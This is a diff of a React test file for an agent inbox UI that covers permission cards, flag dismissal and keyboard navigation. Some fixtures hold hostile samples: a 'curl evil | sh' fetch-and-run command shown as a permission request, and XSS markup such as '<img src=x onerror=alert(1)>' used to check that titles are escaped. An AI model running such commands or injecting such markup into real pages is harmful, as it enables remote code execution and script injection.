@@ -5,18 +5,30 @@ import {
   SHARED_ASK_ALLOW_CHOICE,
   SHARED_ASK_KEEP_CHOICE,
   SHARED_ASK_REPLY_CHOICE,
+  SystemCheckDto,
   type InboxItemDto,
   type ProvenanceDto,
 } from '@10db/contracts';
-import { fireEvent, screen, waitFor, within } from '@testing-library/react';
+import { act, fireEvent, screen, waitFor, within } from '@testing-library/react';
 import { http, HttpResponse, type RequestHandler, type WebSocketHandler } from 'msw';
-import { describe, expect, it } from 'vitest';
+import { afterEach, beforeEach, describe, expect, it } from 'vitest';
+import { lastInboxSearch, rememberScroll, rememberSelected } from './inbox-search';
 import { queryKeys } from '../../daemon/queries';
 import { baseHandlers, daemonUrl, eventStream, renderApp, server } from '../../test/daemon';
-import { batchDto, inboxItemDto, projectViewDto } from '../../test/fixtures';
-import { pickOption } from '../../test/combobox';
-import { openEveryRow, serveInboxPage, tableRows } from '../../test/inbox-page-fixtures';
-import { sendDto } from '../../test/people-fixtures';
+import { batchDto, daemonEvent, inboxItemDto, projectViewDto } from '../../test/fixtures';
+import { chatDto } from '../../test/chat-fixtures';
+import { resetViewportWidth, viewportWidth } from '../../test/window-width';
+import {
+  findText,
+  getText,
+  chooseFilter,
+  findPanelRow,
+  panelRows,
+  panelRowTexts,
+  queryText,
+  serveInboxRows,
+} from '../../test/inbox-page-fixtures';
+import { sendDto, slackConnection } from '../../test/people-fixtures';
 import { knowledgeList, proposalDto, provenanceDto } from '../../test/knowledge-fixtures';
 
 function serve(...overrides: (RequestHandler | WebSocketHandler)[]): void {
@@ -27,21 +39,47 @@ function serve(...overrides: (RequestHandler | WebSocketHandler)[]): void {
   server.use(...overrides);
 }
 
-/** Serves `items` as the open inbox and records every answer posted. */
-function inbox(items: InboxItemDto[]): { answers: { id: string; body: unknown }[] } {
+/**
+ * Serves `items` as the open inbox, for the panel's rows and every other reader, and records every answer
+ * posted. An answered card leaves what is served, as it does in the daemon.
+ */
+function inbox(
+  items: InboxItemDto[],
+  hold?: Parameters<typeof serveInboxRows>[1],
+): {
+  answers: { id: string; body: unknown }[];
+  served: { open: InboxItemDto[] };
+} {
   const answers: { id: string; body: unknown }[] = [];
+  const served = { open: [...items] };
   serve(
-    http.get(daemonUrl('/inbox'), () =>
-      HttpResponse.json(items.filter((item) => !answers.some((a) => a.id === item.id))),
-    ),
+    http.get(daemonUrl('/inbox'), () => HttpResponse.json(served.open)),
+    http.get(daemonUrl('/inbox/:id/context'), () => HttpResponse.json({ messages: [] })),
     http.post(daemonUrl('/inbox/:id/answer'), async ({ params, request }) => {
       const id = String(params['id']);
       answers.push({ id, body: await request.json() });
-      const item = items.find((i) => i.id === id);
+      const item = served.open.find((i) => i.id === id);
+      served.open = served.open.filter((i) => i.id !== id);
       return HttpResponse.json({ ...item, state: 'ANSWERED' });
     }),
   );
-  return { answers };
+  serveInboxRows(served, hold);
+  return { answers, served };
+}
+
+/** The panel's rows. */
+const rows = (): HTMLElement[] =>
+  within(screen.getByRole('listbox', { name: 'Inbox' })).queryAllByRole('option');
+/** The row whose text holds `title`. */
+function rowOf(title: string): HTMLElement {
+  const row = rows().find((candidate) => candidate.textContent.includes(title));
+  if (row === undefined) throw new Error(`no row holds ${title}`);
+  return row;
+}
+const findRow = (title: string): Promise<HTMLElement> => waitFor(() => rowOf(title));
+/** A row's Dismiss, found by its label: it sits over the row, outside the listbox. */
+function dismissOf(title: string, verb = 'Dismiss'): HTMLElement {
+  return screen.getByRole('button', { name: `${verb}: ${title}` });
 }
 
 const key = (k: string, init: { shiftKey?: boolean } = {}): void => {
@@ -50,7 +88,9 @@ const key = (k: string, init: { shiftKey?: boolean } = {}): void => {
 
 /** The option groups of the cards. */
 function optionGroups(): HTMLElement[] {
-  return screen.getAllByRole('radiogroup');
+  return screen
+    .getAllByRole('radiogroup')
+    .filter((group) => group.closest('[aria-label="Inbox panel"]') === null);
 }
 
 /** The expanded card. */
@@ -112,11 +152,21 @@ const rejectedCard = inboxItemDto({
   },
 });
 
+// What the Inbox remembers of a visit (its search, each state's row and scroll) outlives a render, so one
+// test's selection would otherwise open the next test on a row its list may not hold.
+beforeEach(() => {
+  lastInboxSearch.set({});
+  for (const state of ['open', 'waiting', 'resolved'] as const) {
+    rememberSelected(state, null);
+    rememberScroll(state, 0);
+  }
+});
+
 describe('InboxView review findings', () => {
   it('shows each finding with its severity and file:line on a failed card', async () => {
     inbox([rejectedCard]);
     renderApp('/inbox');
-    await screen.findByText(rejectedCard.title);
+    await findText(rejectedCard.title);
     const card = selectedCard();
     expect(within(card).getByText('BLOCKING')).toBeTruthy();
     expect(within(card).getByText('apps/daemon/src/runner/runner.ts:673')).toBeTruthy();
@@ -126,7 +176,7 @@ describe('InboxView review findings', () => {
   it('keeps the full review one click away', async () => {
     inbox([rejectedCard]);
     renderApp('/inbox');
-    await screen.findByText(rejectedCard.title);
+    await findText(rejectedCard.title);
     const card = selectedCard();
     expect(within(card).queryByText(/Trigger: the retry limit\./)).toBeNull();
     fireEvent.click(within(card).getByRole('button', { name: 'Show the full review' }));
@@ -138,7 +188,7 @@ describe('InboxView review findings', () => {
   it('sends the note with Retry', async () => {
     const { answers } = inbox([rejectedCard]);
     renderApp('/inbox');
-    await screen.findByText(rejectedCard.title);
+    await findText(rejectedCard.title);
     const card = selectedCard();
     fireEvent.click(within(card).getByRole('radio', { name: /Retry/ }));
     fireEvent.change(within(card).getByLabelText('Note for the agent (optional)'), {
@@ -157,13 +207,13 @@ describe('InboxView', () => {
   it('says so when the inbox is empty', async () => {
     inbox([]);
     renderApp('/inbox');
-    expect(await screen.findByText('Nothing needs you right now.')).toBeTruthy();
+    expect(await findText('Nothing needs you')).toBeTruthy();
   });
 
   it('moves with j/k, chooses with a digit and sends with Enter', async () => {
     const { answers } = inbox([color, corners]);
     renderApp('/inbox');
-    expect(await screen.findByText('Which badge color?')).toBeTruthy();
+    expect(await findText('Which badge color?')).toBeTruthy();
 
     key('j');
     expect(await screen.findByRole('radio', { name: /Square/ })).toBeTruthy();
@@ -184,7 +234,7 @@ describe('InboxView', () => {
   it('focuses the note with n and sends it with ⌘Enter', async () => {
     const { answers } = inbox([color]);
     renderApp('/inbox');
-    await screen.findByText('Which badge color?');
+    await findText('Which badge color?');
 
     key('1');
     key('n');
@@ -207,9 +257,9 @@ describe('InboxView', () => {
   it('asks for a choice before sending', async () => {
     const { answers } = inbox([color]);
     renderApp('/inbox');
-    await screen.findByText('Which badge color?');
+    await findText('Which badge color?');
     key('Enter');
-    expect(await screen.findByText('Choose an option first (1–5).')).toBeTruthy();
+    expect(await findText('Choose an option first (1–5).')).toBeTruthy();
     expect(answers).toEqual([]);
   });
 
@@ -230,11 +280,11 @@ describe('InboxView', () => {
     });
     inbox([permission]);
     renderApp('/inbox');
-    expect(await screen.findByText('vercel deploy --prod')).toBeTruthy();
+    expect(await findText('vercel deploy --prod')).toBeTruthy();
     for (const name of ['Allow once', 'Always in this project', 'Deny']) {
       expect(screen.getByRole('radio', { name: new RegExp(`^\\d?\\s*${name}`) })).toBeTruthy();
     }
-    expect(screen.queryByText('always_in_project')).toBeNull();
+    expect(queryText('always_in_project')).toBeNull();
   });
 
   it('shows the four permission choices in words and sends the chosen value', async () => {
@@ -256,7 +306,7 @@ describe('InboxView', () => {
     const { answers } = inbox([permission]);
     renderApp('/inbox');
 
-    expect(await screen.findByText('curl -s https://example.com')).toBeTruthy();
+    expect(await findText('curl -s https://example.com')).toBeTruthy();
     for (const name of [
       'Allow once',
       'Allow for this workstream',
@@ -265,8 +315,8 @@ describe('InboxView', () => {
     ]) {
       expect(screen.getByRole('radio', { name: new RegExp(`^\\d?\\s*${name}`) })).toBeTruthy();
     }
-    expect(screen.getByText('Always allow in this project (records a decision)')).toBeTruthy();
-    expect(screen.queryByText('allow_workstream')).toBeNull();
+    expect(getText('Always allow in this project (records a decision)')).toBeTruthy();
+    expect(queryText('allow_workstream')).toBeNull();
 
     fireEvent.click(screen.getByRole('radio', { name: /Allow for this workstream/ }));
     fireEvent.click(screen.getByRole('button', { name: 'Send answer' }));
@@ -296,7 +346,7 @@ describe('InboxView', () => {
     });
     const { answers } = inbox([permission]);
     renderApp('/inbox');
-    await screen.findByText('Allow mcp__aws-billing__credits?');
+    await findText('Allow mcp__aws-billing__credits?');
     fireEvent.click(
       screen.getByRole('radio', { name: /Always allow every aws-billing tool in this project/ }),
     );
@@ -319,10 +369,10 @@ describe('InboxView', () => {
     inbox([hostile]);
     renderApp('/inbox');
 
-    expect(await screen.findByText('<img src=x onerror=alert(1)>')).toBeTruthy();
-    expect(screen.getByText('<b>Bold</b> question')).toBeTruthy();
-    expect(screen.getByText('<script>x</script>')).toBeTruthy();
-    expect(screen.getByText('<i>desc</i>')).toBeTruthy();
+    expect(await findText('<img src=x onerror=alert(1)>')).toBeTruthy();
+    expect(getText('<b>Bold</b> question')).toBeTruthy();
+    expect(getText('<script>x</script>')).toBeTruthy();
+    expect(getText('<i>desc</i>')).toBeTruthy();
     expect(document.body.querySelector('img')).toBeNull();
     expect(document.body.querySelector('main b, main i, main script')).toBeNull();
   });
@@ -372,8 +422,8 @@ describe('InboxView', () => {
     inbox([card]);
     renderApp('/inbox');
 
-    fireEvent.click(await screen.findByText(card.title));
-    await screen.findByText('Failing:', { exact: false });
+    fireEvent.click(await findText(card.title));
+    await findText('Failing:', { exact: false });
     const anchor = screen.queryByRole('link', { name: 'Open on GitHub' });
     if (shown) expect(anchor?.getAttribute('href')).toBe(link);
     else expect(anchor).toBeNull();
@@ -404,8 +454,8 @@ describe('InboxView', () => {
     inbox([card]);
     renderApp('/inbox');
 
-    fireEvent.click(await screen.findByText(card.title));
-    await screen.findByText('Choose a model for each tier', { exact: false });
+    fireEvent.click(await findText(card.title));
+    await findText('Choose a model for each tier', { exact: false });
     const anchor = screen.queryByRole('link', { name: 'Open Accounts in Settings' });
     if (shown) expect(anchor?.getAttribute('href')).toBe('/settings/accounts');
     else expect(anchor).toBeNull();
@@ -434,8 +484,8 @@ describe('InboxView', () => {
     inbox([card]);
     renderApp('/inbox');
 
-    fireEvent.click(await screen.findByText(card.title));
-    await screen.findByText('Sign in to GitHub in Settings', { exact: false });
+    fireEvent.click(await findText(card.title));
+    await findText('Sign in to GitHub in Settings', { exact: false });
     const anchor = screen.queryByRole('link', { name: 'Open Integrations' });
     if (href === null) expect(anchor).toBeNull();
     else expect(anchor?.getAttribute('href')).toBe(href);
@@ -463,8 +513,8 @@ describe('InboxView', () => {
     inbox([card]);
     renderApp('/inbox');
 
-    fireEvent.click(await screen.findByText(card.title));
-    await screen.findByText('Failed steps:', { exact: false });
+    fireEvent.click(await findText(card.title));
+    await findText('Failed steps:', { exact: false });
     const anchor = screen.queryByRole('link', { name: 'Open the step log' });
     if (shown) {
       expect(anchor?.getAttribute('href')).toBe(`file://${logPath}`);
@@ -497,7 +547,7 @@ describe('InboxView', () => {
       );
       renderApp('/inbox');
 
-      fireEvent.click(await screen.findByText(card.title));
+      fireEvent.click(await findText(card.title));
       fireEvent.click(await screen.findByRole('button', { name: button }));
       await waitFor(() => {
         expect(answers).toEqual([{ id: card.id, body: { choice: 'dismissed' } }]);
@@ -510,50 +560,64 @@ describe('InboxView', () => {
     const card = flag('Batch "Alpha" not shipped: the gate failed (exit 1)', 'Last output:');
     inbox([card]);
     renderApp('/inbox');
-    fireEvent.click(await screen.findByText(card.title));
-    await screen.findByText('Last output:');
+    fireEvent.click(await findText(card.title));
+    await findText('Last output:');
     expect(screen.queryByRole('button', { name: 'Retry' })).toBeNull();
     expect(screen.queryByRole('button', { name: 'Abandon' })).toBeNull();
   });
 
-  it('explains a card answered elsewhere and refreshes the list', async () => {
-    let gets = 0;
-    serve(
-      http.get(daemonUrl('/inbox'), () => {
-        gets += 1;
-        return HttpResponse.json([color]);
-      }),
-      http.post(daemonUrl('/inbox/:id/answer'), () =>
-        HttpResponse.json(
+  it('explains a card answered elsewhere, and its row leaves and the next is selected', async () => {
+    const font = inboxItemDto({
+      kind: 'question',
+      title: 'Which font?',
+      body: '',
+      options: [
+        { label: 'Serif', description: '' },
+        { label: 'Sans', description: '' },
+      ],
+    });
+    const { served } = inbox([color, corners, font]);
+    server.use(
+      http.post(daemonUrl('/inbox/:id/answer'), () => {
+        // Answered elsewhere: the card is gone from the daemon's list by the time the answer lands.
+        served.open = served.open.filter((item) => item.id !== color.id);
+        return HttpResponse.json(
           { error: 'conflict', message: `Inbox item ${color.id} is already ANSWERED` },
           { status: 409 },
-        ),
-      ),
+        );
+      }),
     );
     renderApp('/inbox');
-    await screen.findByText('Which badge color?');
-    const getsBefore = gets;
+    await findText('Which badge color?');
 
     key('1');
     key('Enter');
-    expect(await screen.findByText('This card was already answered.')).toBeTruthy();
+    expect(await findText('This card was already answered.')).toBeTruthy();
     await waitFor(() => {
-      expect(gets).toBeGreaterThan(getsBefore);
+      expect(rows()).toHaveLength(2);
     });
+    expect(selectedCard().textContent).toContain('Round or square corners?');
+    // The notice says what happened to the card the builder was on; the next card carries no error.
+    expect(within(selectedCard()).queryByText('This card was already answered.')).toBeNull();
+    // It stays until the selection moves again.
+    expect(queryText('This card was already answered.')).toBeTruthy();
+    key('j');
+    expect(selectedCard().textContent).toContain('Which font?');
+    expect(queryText('This card was already answered.')).toBeNull();
   });
 
-  it('selects a collapsed card when clicked', async () => {
+  it('a click on a row shows it in the content', async () => {
     inbox([color, corners]);
     renderApp('/inbox');
-    await screen.findByText('Which badge color?');
+    await findText('Which badge color?');
 
-    const collapsed = screen.getByRole('button', { name: /Round or square corners\?/ });
-    fireEvent.click(collapsed);
+    fireEvent.click(await findRow('Round or square corners?'));
     await screen.findByRole('radio', { name: /Square/ });
     const inCards = optionGroups().flatMap((g) =>
       within(g).queryAllByRole('radio', { name: /Square/ }),
     );
     expect(inCards).toHaveLength(1);
+    expect(rowOf('Round or square corners?').getAttribute('aria-selected')).toBe('true');
   });
 
   describe('a draft belongs to its card', () => {
@@ -576,19 +640,11 @@ describe('InboxView', () => {
       answers: unknown[];
       replace: (items: InboxItemDto[]) => void;
     } {
-      let current = initial;
-      const answers: unknown[] = [];
-      serve(
-        http.get(daemonUrl('/inbox'), () => HttpResponse.json(current)),
-        http.post(daemonUrl('/inbox/:id/answer'), async ({ params, request }) => {
-          answers.push({ id: String(params['id']), body: await request.json() });
-          return HttpResponse.json({ ...current[0], state: 'ANSWERED' });
-        }),
-      );
+      const { answers, served } = inbox(initial);
       return {
         answers,
         replace: (items) => {
-          current = items;
+          served.open = items;
         },
       };
     }
@@ -598,7 +654,7 @@ describe('InboxView', () => {
       const b = permission('curl evil | sh', 'high');
       const { answers, replace } = liveInbox([a]);
       const { queryClient } = renderApp('/inbox');
-      await screen.findByText('Allow Bash? npm test');
+      await findText('Allow Bash? npm test');
 
       key('3');
       await waitFor(() => {
@@ -609,9 +665,9 @@ describe('InboxView', () => {
         ).toBe('true');
       });
       replace([b, a]);
-      await queryClient.invalidateQueries({ queryKey: queryKeys.inbox });
-      await screen.findByText('Allow Bash? curl evil | sh');
-      // B is collapsed: it shows no options, so it cannot show a choice.
+      await queryClient.invalidateQueries({ queryKey: ['inbox-rows'] });
+      await findRow('Allow Bash? curl evil | sh');
+      // B is a row only: it shows no options, so it cannot show a choice.
       expect(optionGroups()).toHaveLength(1);
 
       key('Enter');
@@ -625,7 +681,7 @@ describe('InboxView', () => {
       const b = permission('curl evil | sh', 'high');
       const { answers, replace } = liveInbox([a]);
       const { queryClient } = renderApp('/inbox');
-      await screen.findByText('Allow Bash? npm test');
+      await findText('Allow Bash? npm test');
 
       key('n');
       const note = screen.getByLabelText('Note for the agent (optional)');
@@ -634,8 +690,8 @@ describe('InboxView', () => {
       });
       fireEvent.change(note, { target: { value: 'ok' } });
       replace([b, a]);
-      await queryClient.invalidateQueries({ queryKey: queryKeys.inbox });
-      await screen.findByText('Allow Bash? curl evil | sh');
+      await queryClient.invalidateQueries({ queryKey: ['inbox-rows'] });
+      await findRow('Allow Bash? curl evil | sh');
 
       // The builder types on: the rest of the note goes wherever focus is now.
       const typingInto = document.activeElement ?? document.body;
@@ -668,29 +724,18 @@ describe('InboxView', () => {
         urgency: 'high',
         options: [],
       });
-      let current = [a, shown];
-      const answers: { id: string; body: unknown }[] = [];
-      serve(
-        http.get(daemonUrl('/inbox'), () =>
-          HttpResponse.json(current.filter((i) => !answers.some((x) => x.id === i.id))),
-        ),
-        http.post(daemonUrl('/inbox/:id/answer'), async ({ params, request }) => {
-          const id = String(params['id']);
-          answers.push({ id, body: await request.json() });
-          return HttpResponse.json({ ...current.find((i) => i.id === id), state: 'ANSWERED' });
-        }),
-      );
+      const { answers, served } = inbox([a, shown]);
       const { queryClient } = renderApp('/inbox');
-      await screen.findByText('Allow Bash? npm test');
+      await findText('Allow Bash? npm test');
 
       key('1');
       key('Enter');
       await waitFor(() => {
         expect(selectedCard().textContent).toContain('docs/shown.md');
       });
-      current = [late, shown];
-      await queryClient.invalidateQueries({ queryKey: queryKeys.inbox });
-      await screen.findByText('Write inside another workstream claim');
+      served.open = [late, shown];
+      await queryClient.invalidateQueries({ queryKey: ['inbox-rows'] });
+      await findRow('Write inside another workstream claim');
       expect(selectedCard().textContent).toContain('docs/shown.md');
 
       key('Enter');
@@ -702,11 +747,10 @@ describe('InboxView', () => {
     it('keeps a card error off the next card', async () => {
       const a = permission('npm test', 'normal');
       const b = permission('ls', 'normal');
-      let items = [a, b];
-      serve(
-        http.get(daemonUrl('/inbox'), () => HttpResponse.json(items)),
+      const { served } = inbox([a, b]);
+      server.use(
         http.post(daemonUrl('/inbox/:id/answer'), () => {
-          items = [b];
+          served.open = [b];
           return HttpResponse.json(
             { error: 'conflict', message: 'already ANSWERED' },
             { status: 409 },
@@ -714,42 +758,53 @@ describe('InboxView', () => {
         }),
       );
       renderApp('/inbox');
-      await screen.findByText('Allow Bash? npm test');
+      await findText('Allow Bash? npm test');
       key('1');
       key('Enter');
       await waitFor(() => {
-        expect(screen.queryByText('Allow Bash? npm test')).toBeNull();
+        expect(queryText('Allow Bash? npm test')).toBeNull();
       });
-      expect(await screen.findByText('Allow Bash? ls')).toBeTruthy();
-      expect(screen.queryByText('This card was already answered.')).toBeNull();
+      expect(await findText('Allow Bash? ls')).toBeTruthy();
+      expect(within(selectedCard()).queryByText('This card was already answered.')).toBeNull();
     });
 
     it('does not send a choice that is not one of the card options', async () => {
       const { answers } = inbox([color]);
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
+      await findText('Which badge color?');
       key('4');
       key('Enter');
-      expect(await screen.findByText('Choose an option first (1–5).')).toBeTruthy();
+      expect(await findText('Choose an option first (1–5).')).toBeTruthy();
       expect(answers).toEqual([]);
     });
   });
 
   describe('keys outside the selected card', () => {
-    it('leaves Enter on a focused collapsed card to select it', async () => {
-      const { answers } = inbox([color, corners]);
+    it("leaves Enter on a focused row's Dismiss to that button", async () => {
+      const stray = flag('Write outside every claim', 'docs/notes.md');
+      const { answers } = inbox([color, stray]);
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
-      const collapsed = screen.getByRole('button', { name: /Round or square corners\?/ });
-      collapsed.focus();
-      expect(fireEvent.keyDown(collapsed, { key: 'Enter' })).toBe(true);
+      await findText('Which badge color?');
+      await findRow('Write outside every claim');
+      const dismiss = dismissOf('Write outside every claim');
+      dismiss.focus();
+      expect(fireEvent.keyDown(dismiss, { key: 'Enter' })).toBe(true);
       expect(answers).toEqual([]);
+    });
+
+    it('moves with j from the list itself', async () => {
+      inbox([color, corners]);
+      renderApp('/inbox');
+      await findText('Which badge color?');
+      const list = screen.getByRole('listbox', { name: 'Inbox' });
+      fireEvent.keyDown(list, { key: 'j' });
+      expect(await screen.findByRole('radio', { name: /Square/ })).toBeTruthy();
     });
 
     it('leaves Enter on a navigation link alone', async () => {
       const { answers } = inbox([color]);
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
+      await findText('Which badge color?');
       const link = screen.getByRole('link', { name: /Board/ });
       link.focus();
       expect(fireEvent.keyDown(link, { key: 'Enter' })).toBe(true);
@@ -761,7 +816,7 @@ describe('InboxView', () => {
     it('moves with ↑ and ↓ as well as j and k', async () => {
       inbox([color, corners]);
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
+      await findText('Which badge color?');
       key('ArrowDown');
       expect(await screen.findByRole('radio', { name: /Square/ })).toBeTruthy();
       key('ArrowUp');
@@ -785,7 +840,7 @@ describe('InboxView', () => {
     it('leaves ↑ and ↓ to the page when there is no card to move to', async () => {
       inbox([color, corners]);
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
+      await findText('Which badge color?');
       // fireEvent answers false when the default action was cancelled.
       expect(fireEvent.keyDown(document.body, { key: 'ArrowUp' })).toBe(true);
       expect(fireEvent.keyDown(document.body, { key: 'ArrowDown' })).toBe(false);
@@ -796,8 +851,8 @@ describe('InboxView', () => {
     it('shows no line of shortcut instructions', async () => {
       inbox([color]);
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
-      expect(screen.queryByText(/to move/)).toBeNull();
+      await findText('Which badge color?');
+      expect(queryText(/to move/)).toBeNull();
     });
 
     it('shows Enter on Send Answer and each option its number key', async () => {
@@ -812,7 +867,7 @@ describe('InboxView', () => {
     it('lists every shortcut from the ? button and the ? key', async () => {
       inbox([color]);
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
+      await findText('Which badge color?');
 
       const help = screen.getByRole('button', { name: 'Keyboard shortcuts' });
       help.focus();
@@ -822,6 +877,7 @@ describe('InboxView', () => {
         'Move between cards',
         'Choose an option',
         'Write a note',
+        'Dismiss a flag',
         'Send the answer, dismiss a flag, or open the UI Workbench',
         'Send from the note',
         'Show these shortcuts',
@@ -840,34 +896,90 @@ describe('InboxView', () => {
   });
 
   describe('flags', () => {
-    it('shows what a collapsed flag is about', async () => {
+    it('shows what a flag is about on its row', async () => {
       inbox([color, flag('Write outside every claim', 'docs/notes.md (main checkout)')]);
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
-      const row = screen.getByRole('button', { name: /Write outside every claim/ });
+      await findText('Which badge color?');
+      const row = await findRow('Write outside every claim');
       expect(row.textContent).toContain('docs/notes.md (main checkout)');
+      expect(row.textContent).toContain('FLAG');
     });
 
-    it('dismisses a collapsed flag from its row without opening it', async () => {
+    it('dismisses a flag from its row without opening it', async () => {
       const stray = flag('Write outside every claim', 'docs/notes.md');
       const { answers } = inbox([color, stray]);
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
-      fireEvent.click(screen.getByRole('button', { name: 'Dismiss' }));
+      await findText('Which badge color?');
+      await findRow('Write outside every claim');
+      fireEvent.click(dismissOf('Write outside every claim'));
       await waitFor(() => {
         expect(answers).toEqual([{ id: stray.id, body: { choice: 'dismissed' } }]);
       });
       expect(selectedCard().textContent).toContain('Which badge color?');
+      await waitFor(() => {
+        expect(rows()).toHaveLength(1);
+      });
+    });
+
+    it("keeps a row's Dismiss out of the listbox, so no control nests inside an option", async () => {
+      const stray = flag('Write outside every claim', 'docs/notes.md');
+      inbox([color, stray]);
+      renderApp('/inbox');
+      await findText('Which badge color?');
+      const row = await findRow('Write outside every claim');
+      expect(row.querySelector('button')).toBeNull();
+      const list = screen.getByRole('listbox', { name: 'Inbox' });
+      expect(list.contains(dismissOf('Write outside every claim'))).toBe(false);
+    });
+
+    it('dismisses the selected flag with e', async () => {
+      const stray = flag('Write outside every claim', 'docs/notes.md');
+      const { answers } = inbox([color, stray]);
+      renderApp('/inbox');
+      await findText('Which badge color?');
+      key('j');
+      await findText('Write outside every claim');
+      key('e');
+      await waitFor(() => {
+        expect(answers).toEqual([{ id: stray.id, body: { choice: 'dismissed' } }]);
+      });
+      expect(await findText('Which badge color?')).toBeTruthy();
+    });
+
+    it('keeps focus on the list when the focused selected row leaves', async () => {
+      const first = flag('First stray', 'a.md');
+      const second = flag('Second stray', 'b.md');
+      inbox([first, second]);
+      renderApp('/inbox');
+      await findText('First stray');
+      await waitFor(() => {
+        expect(document.activeElement).toBe(rowOf('First stray'));
+      });
+      key('e');
+      await waitFor(() => {
+        expect(rows()).toHaveLength(1);
+      });
+      await waitFor(() => {
+        expect(document.activeElement).toBe(rowOf('Second stray'));
+      });
+    });
+
+    it('leaves e alone on a card that cannot be dismissed', async () => {
+      const { answers } = inbox([color]);
+      renderApp('/inbox');
+      await findText('Which badge color?');
+      key('e');
+      expect(answers).toEqual([]);
     });
 
     it('groups identical flags into one row with a count, and dismisses them together', async () => {
       const copies = [1, 2, 3].map(() => flag('MCP server failed', 'mantine exited'));
       const { answers } = inbox([color, ...copies]);
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
-      const rows = screen.getAllByRole('button', { name: /MCP server failed/ });
-      expect(rows).toHaveLength(1);
-      expect(rows[0]?.textContent).toContain('×3');
+      await findText('Which badge color?');
+      const grouped = await findRow('MCP server failed');
+      expect(rows().filter((row) => row.textContent.includes('MCP server failed'))).toHaveLength(1);
+      expect(grouped.textContent).toContain('×3');
 
       key('j');
       expect(selectedCard().textContent).toContain('MCP server failed');
@@ -875,15 +987,20 @@ describe('InboxView', () => {
       await waitFor(() => {
         expect(answers).toEqual(copies.map((c) => ({ id: c.id, body: { choice: 'dismissed' } })));
       });
+      // Three answers took the row out, and the card the builder was on is shown again.
+      await waitFor(() => {
+        expect(rows()).toHaveLength(1);
+      });
+      expect(selectedCard().textContent).toContain('Which badge color?');
     });
 
-    it('says in words how many identical cards a folded row holds', async () => {
+    it('says in words how many identical cards a row holds', async () => {
       const copies = [1, 2].map(() => flag('Batch not started', 'no lane free'));
       inbox([color, ...copies]);
       renderApp('/inbox');
-      await screen.findByText('Batch not started');
-      expect(screen.getByText('2 identical flags')).toBeTruthy();
-      expect(screen.getByRole('button', { name: 'Dismiss All' })).toBeTruthy();
+      await findText('Which badge color?');
+      expect((await findRow('Batch not started')).textContent).toContain('×2');
+      expect(dismissOf('Batch not started', 'Dismiss All')).toBeTruthy();
       key('j');
       expect(within(selectedCard()).getByText(/2 identical flags are open/)).toBeTruthy();
     });
@@ -895,10 +1012,11 @@ describe('InboxView', () => {
       const copies = [1, 2].map(() => flag(title, 'no lane free'));
       inbox([color, ...copies]);
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
-      for (const text of ['Flag', '×2']) {
-        const badge = screen.getByText(text).closest('.mantine-Badge-root');
-        expect(badge?.getAttribute('style')).toContain('flex-shrink: 0');
+      await findText('Which badge color?');
+      const row = await findRow('Batch not started');
+      for (const text of ['FLAG', '×2']) {
+        const tag = within(row).getByText(text);
+        expect(tag.getAttribute('style')).toContain('flex-shrink: 0');
       }
       key('j');
       for (const text of ['Flag', '×2']) {
@@ -910,28 +1028,27 @@ describe('InboxView', () => {
     it('does not paint a flag red like an error', async () => {
       inbox([flag('Write outside every claim', 'docs/notes.md')]);
       renderApp('/inbox');
-      await screen.findByText('Write outside every claim');
+      await findText('Write outside every claim');
       const badge = within(selectedCard()).getByText('Flag').closest('.mantine-Badge-root');
       expect(badge?.getAttribute('style')).toContain('yellow');
     });
 
-    it("keeps the open card's draft when a collapsed flag fails to dismiss, and says so beside it", async () => {
+    it("keeps the open card's draft when a flag's row fails to dismiss, and says so on the row", async () => {
       const stray = flag('Write outside every claim', 'docs/notes.md');
-      serve(
-        http.get(daemonUrl('/inbox'), () => HttpResponse.json([color, stray])),
+      inbox([color, stray]);
+      server.use(
         http.post(daemonUrl('/inbox/:id/answer'), () =>
           HttpResponse.json({ error: 'internal', message: 'The daemon broke' }, { status: 500 }),
         ),
       );
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
+      await findText('Which badge color?');
       key('2');
       const note = screen.getByLabelText('Note for the agent (optional)');
       fireEvent.change(note, { target: { value: 'half written' } });
 
-      const row = screen.getByRole('button', { name: /Write outside every claim/ }).parentElement;
-      if (!row) throw new Error('the flag row has no container');
-      fireEvent.click(within(row).getByRole('button', { name: 'Dismiss' }));
+      const row = await findRow('Write outside every claim');
+      fireEvent.click(dismissOf('Write outside every claim'));
 
       expect(await within(row).findByText('The daemon broke')).toBeTruthy();
       expect(screen.getByRole('radio', { name: /Red/ }).getAttribute('aria-checked')).toBe('true');
@@ -942,11 +1059,8 @@ describe('InboxView', () => {
 
     it('keeps a group selected while its flags are dismissed, and shows a failure on it', async () => {
       const copies = [1, 2, 3].map(() => flag('MCP server failed', 'mantine exited'));
-      const answered: string[] = [];
-      serve(
-        http.get(daemonUrl('/inbox'), () =>
-          HttpResponse.json([color, ...copies].filter((i) => !answered.includes(i.id))),
-        ),
+      const { answers, served } = inbox([color, ...copies]);
+      server.use(
         http.post(daemonUrl('/inbox/:id/answer'), ({ params }) => {
           const id = String(params['id']);
           if (id === copies[1]?.id)
@@ -954,28 +1068,30 @@ describe('InboxView', () => {
               { error: 'internal', message: 'The daemon broke' },
               { status: 500 },
             );
-          answered.push(id);
+          answers.push({ id, body: { choice: 'dismissed' } });
+          // A dismissed flag has left the daemon's list, as in the daemon.
+          served.open = served.open.filter((c) => c.id !== id);
           return HttpResponse.json({ ...copies.find((c) => c.id === id), state: 'RESOLVED' });
         }),
       );
       renderApp('/inbox');
-      await screen.findByText('Which badge color?');
+      await findText('Which badge color?');
       key('j');
       expect(selectedCard().textContent).toContain('MCP server failed');
       key('Enter');
 
       expect(await within(selectedCard()).findByText('The daemon broke')).toBeTruthy();
+      expect(await findRow('×2')).toBeTruthy();
       expect(selectedCard().textContent).toContain('×2');
-      expect(answered).toEqual([copies[0]?.id]);
+      expect(answers.map((a) => a.id)).toEqual([copies[0]?.id]);
     });
 
-    it('refreshes the list when a flag was already closed elsewhere', async () => {
+    it('takes a flag out when it was already closed elsewhere', async () => {
       const stray = flag('Write outside every claim', 'docs/notes.md');
